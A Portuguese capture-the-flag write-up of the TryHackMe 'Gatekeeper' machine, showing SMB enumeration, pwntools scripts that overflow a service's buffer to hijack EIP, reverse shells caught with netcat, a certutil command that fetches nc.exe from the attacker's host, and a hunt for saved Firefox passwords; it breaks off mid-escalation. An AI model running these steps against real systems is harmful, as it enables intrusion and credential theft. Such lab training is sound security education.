

# Gatekeeper - TryHackMe (Medium)

**Autor:** Arthur Pinheiro

**Tags:** buffer overflow, smb, privilege escalation, windows, psexec

**Sumário:** Máquina Windows vulnerável a buffer overflow.
Para pos-exploitation, foi utilizado o psexec que se autentica através do protocolo SMB.
O psexec é um serviço desenvolvido pela Microsoft que permite a execução de processos em SOs Windows remotamente, por isso, ele executa esses processos com privilégios de sistema e ele faz isso com qualquer credencial administrativa.

# Information Gathering

## Portscan

Fiz um portscan a fim de saber quais serviços estão sendo executados na máquina:

```bash
┌──(kali㉿kali)-[~/gatekeeper]
└─$ sudo nmap -Pn -O 10.10.150.182 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 15:02 EDT
Nmap scan report for 10.10.150.182
Host is up (0.21s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49165/tcp open  unknown
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista|8.1
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.82 seconds
```



# Footprinting

## Enumeration

Observei que o alvo está rodando SMB. Apesar de não ter rodado o nmap com -sC (default scripts scan), consegui enumerar os shares do smb:

```bash
┌──(kali㉿kali)-[~/gatekeeper]
└─$ smbclient -L //10.10.150.182 -N                                                                           

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.150.182 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

A mensagem *Unable to connect with SMB1 - no workgroup available* é devido ao alvo não estar servindo SMBv1 (o que daria para explorar eternalblue).

Agora, posso listar tudo de Users (recurse ON) pra ver se consigo alguma coisa útil.


```bash
┌──(kali㉿kali)-[~/gatekeeper]
└─$ smbclient //10.10.150.182/Users -N 
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

\Default
  .                                 DHR        0  Tue Jul 14 03:07:31 2009
  ..                                DHR        0  Tue Jul 14 03:07:31 2009
  AppData                           DHn        0  Mon Jul 13 23:20:08 2009
  Desktop                            DR        0  Mon Jul 13 22:34:59 2009
  Documents                          DR        0  Tue Jul 14 01:08:56 2009
  Downloads                          DR        0  Mon Jul 13 22:34:59 2009
  Favorites                          DR        0  Mon Jul 13 22:34:59 2009
  Links                              DR        0  Mon Jul 13 22:34:59 2009
  Music                              DR        0  Mon Jul 13 22:34:59 2009
  NTUSER.DAT                       AHSn   262144  Sun Apr 19 15:51:09 2020
  NTUSER.DAT.LOG                     AH     1024  Tue Apr 12 04:32:10 2011
  NTUSER.DAT.LOG1                    AH   189440  Sun Apr 19 14:52:07 2020
  NTUSER.DAT.LOG2                    AH        0  Mon Jul 13 22:34:08 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf    AHS    65536  Tue Jul 14 00:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009
  NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Tue Jul 14 00:45:54 2009
  Pictures                           DR        0  Mon Jul 13 22:34:59 2009
  Saved Games                        Dn        0  Mon Jul 13 22:34:59 2009
  Videos                             DR        0  Mon Jul 13 22:34:59 2009

\Share
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

\Default\AppData
  .                                 DHn        0  Mon Jul 13 23:20:08 2009
  ..                                DHn        0  Mon Jul 13 23:20:08 2009
  Local                              Dn        0  Tue Jul 14 01:08:56 2009
  Roaming                            Dn        0  Tue Apr 12 04:28:15 2011

\Default\Desktop
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Documents
  .                                  DR        0  Tue Jul 14 01:08:56 2009
  ..                                 DR        0  Tue Jul 14 01:08:56 2009

\Default\Downloads
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Favorites
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Links
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Music
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Pictures
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\Saved Games
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\Videos
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Local
  .                                  Dn        0  Tue Jul 14 01:08:56 2009
  ..                                 Dn        0  Tue Jul 14 01:08:56 2009
  Microsoft                          Dn        0  Mon Jul 13 23:20:08 2009
  Temp                               Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming
  .                                  Dn        0  Tue Apr 12 04:28:15 2011
  ..                                 Dn        0  Tue Apr 12 04:28:15 2011
  Media Center Programs              Dn        0  Tue Apr 12 04:28:15 2011
  Microsoft                         DSn        0  Mon Jul 13 23:20:08 2009

\Default\AppData\Local\Microsoft
  .                                  Dn        0  Mon Jul 13 23:20:08 2009
  ..                                 Dn        0  Mon Jul 13 23:20:08 2009
  Windows                            Dn        0  Mon Jul 13 23:20:08 2009

\Default\AppData\Local\Temp
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Media Center Programs
  .                                  Dn        0  Tue Apr 12 04:28:15 2011
  ..                                 Dn        0  Tue Apr 12 04:28:15 2011

\Default\AppData\Roaming\Microsoft
  .                                 DSn        0  Mon Jul 13 23:20:08 2009
  ..                                DSn        0  Mon Jul 13 23:20:08 2009
  Internet Explorer                   D        0  Mon Jul 13 23:20:08 2009
  Windows                            Dn        0  Mon Jul 13 23:20:08 2009

\Default\AppData\Local\Microsoft\Windows
  .                                  Dn        0  Mon Jul 13 23:20:08 2009
  ..                                 Dn        0  Mon Jul 13 23:20:08 2009
  GameExplorer                       Dn        0  Mon Jul 13 22:34:59 2009
  History                            DS        0  Mon Jul 13 22:34:59 2009
  Temporary Internet Files          DSn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Internet Explorer
  .                                   D        0  Mon Jul 13 23:20:08 2009
  ..                                  D        0  Mon Jul 13 23:20:08 2009
  Quick Launch                       DR        0  Tue Jul 14 00:49:38 2009

\Default\AppData\Roaming\Microsoft\Windows
  .                                  Dn        0  Mon Jul 13 23:20:08 2009
  ..                                 Dn        0  Mon Jul 13 23:20:08 2009
  Cookies                            Dn        0  Mon Jul 13 22:34:59 2009
  Network Shortcuts                  Dn        0  Mon Jul 13 22:34:59 2009
  Printer Shortcuts                  Dn        0  Mon Jul 13 22:35:18 2009
  Recent                             DR        0  Mon Jul 13 22:34:59 2009
  SendTo                            DRn        0  Tue Jul 14 00:54:59 2009
  Start Menu                         DR        0  Mon Jul 13 23:20:08 2009
  Templates                          Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Local\Microsoft\Windows\GameExplorer
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Local\Microsoft\Windows\History
  .                                  DS        0  Mon Jul 13 22:34:59 2009
  ..                                 DS        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Local\Microsoft\Windows\Temporary Internet Files
  .                                 DSn        0  Mon Jul 13 22:34:59 2009
  ..                                DSn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch
  .                                  DR        0  Tue Jul 14 00:49:38 2009
  ..                                 DR        0  Tue Jul 14 00:49:38 2009
  desktop.ini                       AHS      146  Tue Jul 14 00:49:38 2009
  Shows Desktop.lnk                   A      290  Tue Jul 14 00:49:38 2009
  Window Switcher.lnk                 A      272  Tue Jul 14 00:49:38 2009

\Default\AppData\Roaming\Microsoft\Windows\Cookies
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Windows\Network Shortcuts
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Windows\Printer Shortcuts
  .                                  Dn        0  Mon Jul 13 22:35:18 2009
  ..                                 Dn        0  Mon Jul 13 22:35:18 2009

\Default\AppData\Roaming\Microsoft\Windows\Recent
  .                                  DR        0  Mon Jul 13 22:34:59 2009
  ..                                 DR        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Windows\SendTo
  .                                 DRn        0  Tue Jul 14 00:54:59 2009
  ..                                DRn        0  Tue Jul 14 00:54:59 2009
  Compressed (zipped) Folder.ZFSendToTarget      A        3  Wed Jun 10 16:45:28 2009
  Desktop (create shortcut).DeskLink      A        7  Wed Jun 10 16:44:21 2009
  Desktop.ini                       AHS      558  Tue Jul 14 00:54:59 2009
  Fax Recipient.lnk                  An     1238  Tue Jul 14 00:54:59 2009
  Mail Recipient.MAPIMail             A        4  Wed Jun 10 16:44:21 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu
  .                                  DR        0  Mon Jul 13 23:20:08 2009
  ..                                 DR        0  Mon Jul 13 23:20:08 2009
  Programs                            D        0  Mon Jul 13 23:20:08 2009

\Default\AppData\Roaming\Microsoft\Windows\Templates
  .                                  Dn        0  Mon Jul 13 22:34:59 2009
  ..                                 Dn        0  Mon Jul 13 22:34:59 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
  .                                   D        0  Mon Jul 13 23:20:08 2009
  ..                                  D        0  Mon Jul 13 23:20:08 2009
  Accessories                        DR        0  Tue Jul 14 00:54:32 2009
  Maintenance                        DR        0  Tue Jul 14 00:49:38 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories
  .                                  DR        0  Tue Jul 14 00:54:32 2009
  ..                                 DR        0  Tue Jul 14 00:54:32 2009
  Accessibility                      DR        0  Tue Jul 14 00:54:02 2009
  Command Prompt.lnk                  A     1280  Tue Jul 14 00:54:27 2009
  Desktop.ini                       AHS      678  Tue Jul 14 00:54:32 2009
  Notepad.lnk                         A     1304  Tue Jul 14 00:54:32 2009
  Run.lnk                             A      262  Tue Jul 14 00:49:38 2009
  System Tools                       DR        0  Tue Jul 14 00:54:59 2009
  Windows Explorer.lnk                A     1228  Tue Jul 14 00:49:38 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance
  .                                  DR        0  Tue Jul 14 00:49:38 2009
  ..                                 DR        0  Tue Jul 14 00:49:38 2009
  Desktop.ini                       AHS      318  Tue Jul 14 00:49:38 2009
  Help.lnk                            A      262  Tue Jul 14 00:49:38 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility
  .                                  DR        0  Tue Jul 14 00:54:02 2009
  ..                                 DR        0  Tue Jul 14 00:54:02 2009
  Desktop.ini                       AHS      704  Tue Jul 14 00:54:02 2009
  Ease of Access.lnk                  A     1358  Tue Jul 14 00:54:01 2009
  Magnify.lnk                         A     1258  Tue Jul 14 00:54:00 2009
  Narrator.lnk                        A     1262  Tue Jul 14 00:54:02 2009
  On-Screen Keyboard.lnk              A     1250  Tue Jul 14 00:54:00 2009

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools
  .                                  DR        0  Tue Jul 14 00:54:59 2009
  ..                                 DR        0  Tue Jul 14 00:54:59 2009
  computer.lnk                        A      262  Tue Jul 14 00:49:38 2009
  Control Panel.lnk                   A      262  Tue Jul 14 00:49:38 2009
  Desktop.ini                       AHS      592  Tue Jul 14 00:54:59 2009
  Private Character Editor.lnk        A     1306  Tue Jul 14 00:54:59 2009

                7863807 blocks of size 4096. 3888149 blocks available
smb: \> mget *
getting file \desktop.ini of size 174 as desktop.ini (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \Default\NTUSER.DAT of size 262144 as Default/NTUSER.DAT (142.9 KiloBytes/sec) (average 86.8 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG of size 1024 as Default/NTUSER.DAT.LOG (1.0 KiloBytes/sec) (average 64.4 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG1 of size 189440 as Default/NTUSER.DAT.LOG1 (152.6 KiloBytes/sec) (average 85.0 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG2 of size 0 as Default/NTUSER.DAT.LOG2 (0.0 KiloBytes/sec) (average 74.9 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf of size 65536 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf (65.7 KiloBytes/sec) (average 73.6 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms of size 524288 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms (388.5 KiloBytes/sec) (average 124.3 KiloBytes/sec)
getting file \Default\NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms of size 524288 as Default/NTUSER.DAT{016888bd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms (380.7 KiloBytes/sec) (average 160.4 KiloBytes/sec)
getting file \Share\gatekeeper.exe of size 13312 as Share/gatekeeper.exe (15.2 KiloBytes/sec) (average 148.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini of size 146 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini (0.2 KiloBytes/sec) (average 136.5 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk of size 290 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk (0.3 KiloBytes/sec) (average 126.1 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk of size 272 as Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk (0.3 KiloBytes/sec) (average 117.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget of size 3 as Default/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget (0.0 KiloBytes/sec) (average 108.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink of size 7 as Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink (0.0 KiloBytes/sec) (average 101.9 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\SendTo\Desktop.ini of size 558 as Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini (0.6 KiloBytes/sec) (average 96.2 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk of size 1238 as Default/AppData/Roaming/Microsoft/Windows/SendTo/Fax Recipient.lnk (1.4 KiloBytes/sec) (average 91.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail of size 4 as Default/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail (0.0 KiloBytes/sec) (average 86.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Command Prompt.lnk of size 1280 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Command Prompt.lnk (1.4 KiloBytes/sec) (average 82.2 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Desktop.ini of size 678 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini (0.8 KiloBytes/sec) (average 78.6 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk of size 1304 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Notepad.lnk (1.4 KiloBytes/sec) (average 75.1 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Run.lnk of size 262 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Run.lnk (0.3 KiloBytes/sec) (average 72.0 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Windows Explorer.lnk of size 1228 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Windows Explorer.lnk (1.3 KiloBytes/sec) (average 69.1 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini of size 318 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini (0.2 KiloBytes/sec) (average 65.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Help.lnk of size 262 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Help.lnk (0.3 KiloBytes/sec) (average 62.8 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Desktop.ini of size 704 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Accessibility/Desktop.ini (0.7 KiloBytes/sec) (average 60.4 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Ease of Access.lnk of size 1358 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Accessibility/Ease of Access.lnk (1.3 KiloBytes/sec) (average 58.2 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Magnify.lnk of size 1258 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Accessibility/Magnify.lnk (1.3 KiloBytes/sec) (average 56.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\Narrator.lnk of size 1262 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Accessibility/Narrator.lnk (1.2 KiloBytes/sec) (average 54.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Accessibility\On-Screen Keyboard.lnk of size 1250 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Accessibility/On-Screen Keyboard.lnk (1.3 KiloBytes/sec) (average 52.6 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\computer.lnk of size 262 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/System Tools/computer.lnk (0.3 KiloBytes/sec) (average 51.1 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Control Panel.lnk of size 262 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/System Tools/Control Panel.lnk (0.3 KiloBytes/sec) (average 49.6 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Desktop.ini of size 592 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/System Tools/Desktop.ini (0.6 KiloBytes/sec) (average 48.2 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Private Character Editor.lnk of size 1306 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/System Tools/Private Character Editor.lnk (1.3 KiloBytes/sec) (average 46.8 KiloBytes/sec)

```
Muito bem... Consegui o arquivo gatekeeper.exe... Ao executar esse programa no wine ou numa máquina windows, pude ver que ele é o serviço rodando na porta 31337 no servidor.

Eu sei disso, pq executei o programa numa vm Windows 10 e rodei netstat -na pra ver que ela escuta a porta 31337.

# Initial Access


Agora, vou abrir esse programa no ImmunityDebugger e testar se é vulnerável a buffer overflow.


```bash
┌──(kali㉿kali)-[~/gatekeeper]
└─$ nc 192.168.56.108 31337
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```


Com "poucos" caracteres a aplicação quebra. Agora, tenho que achar o offset.

Para fazer isso, criei esse script que manda "mensagem" para o programa com caracteres cíclicos e únicos.

```python
from pwn import *
import subprocess


ADDR, PORT = "192.168.56.108", 31337


p = remote(ADDR, PORT)

res = subprocess.run(["msf-pattern_create", "-l", "200"], capture_output=True, check=True)

p.send(res.stdout + b"\r\n")

p.close()
```


Após executar o script acima, vi que EIP ficou com 39654138. Agora, só preciso calcular o offset.

```bash
┌──(kali㉿kali)-[~/gatekeeper]
└─$ msf-pattern_offset -l 200 -q 39654138
[*] Exact match at offset 146
```


Muito bem... já tenho o meu offset. Agora, vou mandar a quantidade certa e vou colocar + BBBB pra ver se acertei o EIP mesmo...Para isso, criei o script abaixo


```python
from pwn import *
import subprocess

ADDR, PORT = "192.168.56.108", 31337

p = remote(ADDR, PORT)
payload = b"A" * 146 + b"BBBB" + b"C" * 32

p.send(payload + b"\r\n")

p.close()
```


E após executar, vi que deu certo. Agora, já posso procurar pelos módulos com o mona. (O mona é um plugin do ImmunityDebugger.)

```bash
!mona modules
```


Vi que o gatekeeper.exe está com SafeSEH.

Escolhi um ponto do ESP para fazer o EIP apontar

```bash
!mona jmp -r esp -m gatekeeper.exe
```

* 0x080416bf
* 0x080414c3

Bem... o SafeSEH não influencia na técnica que estou usando agora e que usei no brainstorm (outra room - EIP overwrite + JMP ESP). Por esse motivo, posso continuar com ela.

Agora, só preciso sobrescrever o EIP com o endereço do ESP e, em seguida, colocar meu shellcode.

```bash
!mona find -s "\xff\xe4" -m gatekeeper.exe   ; JMP ESP
!mona find -s "\x54\xc3"  -m gatekeeper.exe   ; PUSH ESP; RET
!mona find -s "\xff\xd4"  -m gatekeeper.exe   ; CALL ESP

```

Deu certo com a minha vm Windows 10. 

```bash
┌──(kali㉿kali)-[~/brainstorm]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.56.103] from (UNKNOWN) [192.168.56.108] 53384
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. Todos os direitos reservados.

C:\Users\vboxuser\Documents>
```


Agora é só setar meu listener e testar o exploit. Agora só falta testar na máquina do thm.

```bash

┌──(kali㉿kali)-[~/brainstorm]
└─$ nc -lnvp 4444  
listening on [any] 4444 ...
connect to [10.23.149.250] from (UNKNOWN) [10.10.46.133] 49168
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his 
"dostackbufferoverflowgood" program.  Thank you!
```


Excelente! Obtive a primeira flag.

Agora, preciso escalar privilégio para obter a outra flag.


# Privilege Escalation

No início, eu testei várias vulnerabilidades. Algumas tasks pareciam estar vulneráveis a unquoted path, mas eu não consegui explorar e acabei em caindo em alguns rabbit roles.

Depois de algum tempo lembrei do AppData e resolvi explorar um pouco.

Mas antes disso, para facilitar a transferência de arquivos, resolvi colocar um executável do netcat na máquina Windows. Vou precisar transferir alguns arquivos da máquina Windows.

A pasta Firefox tem o arquivo logins.json onde são guardadas senhas salvas do navegador



```bash
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>certutil -urlcache -f http://10.23.149.250:8080/nc.exe nc.exe

certutil -urlcache -f http://10.23.149.250:8080/nc.exe nc.exe

****  Online  ****

CertUtil: -URLCache command completed successfully.

  

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>dir

dir

 Volume in drive C has no label.

 Volume Serial Number is 3ABE-D44B

  

 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

  

08/15/2025  08:29 PM    <DIR>          .

08/15/2025  08:29 PM    <DIR>          ..

05/14/2020  10:45 PM    <DIR>          ljfn812a.default-release

08/15/2025  08:29 PM                 0 logins.json

08/15/2025  08:28 PM            38,616 nc.exe

04/21/2020  05:00 PM    <DIR>          rajfzh3y.default

               2 File(s)         38,616 bytes

               4 Dir(s)  15,835,533,312 bytes free

```

Esse arquivo logins.json está vazio (0 kbytes). Sendo assim, resolvi verificar a pasta *default-release*.

```bash

C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles>cd ljfn812a.default-release

cd ljfn812a.default-release

  

